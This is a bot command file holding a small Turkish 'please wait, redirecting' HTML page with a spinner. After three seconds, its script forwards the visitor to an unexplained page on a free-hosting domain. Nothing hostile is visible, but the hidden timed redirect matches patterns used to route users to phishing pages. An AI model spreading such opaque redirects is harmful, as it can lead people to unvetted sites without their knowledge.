/*CMD
  command: index.html
  help: 
  need_reply: false
  auto_retry_time: 
  folder: Menu2

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Lütfen Bekleyin</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      background: #0f172a;
      color: #fff;
      font-family: Arial, sans-serif;
    }
    h1 {
      margin-bottom: 20px;
      font-size: 24px;
    }
    .spinner {
      width: 60px;
      height: 60px;
      border: 6px solid rgba(255, 255, 255, 0.2);
      border-top-color: #2563eb;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .note {
      margin-top: 20px;
      font-size: 14px;
      color: #aaa;
    }
  </style>
</head>
<body>

  <h1>Lütfen Bekleyin...</h1>
  <div class="spinner"></div>
  <div class="note">Yönlendiriliyorsunuz, lütfen bekleyin.</div>

  <script>
    setTimeout(() => {
      window.location.href = "https://afdajans.xo.je/bxjx.html";
    }, 3000);
  </script>

</body>
</html>
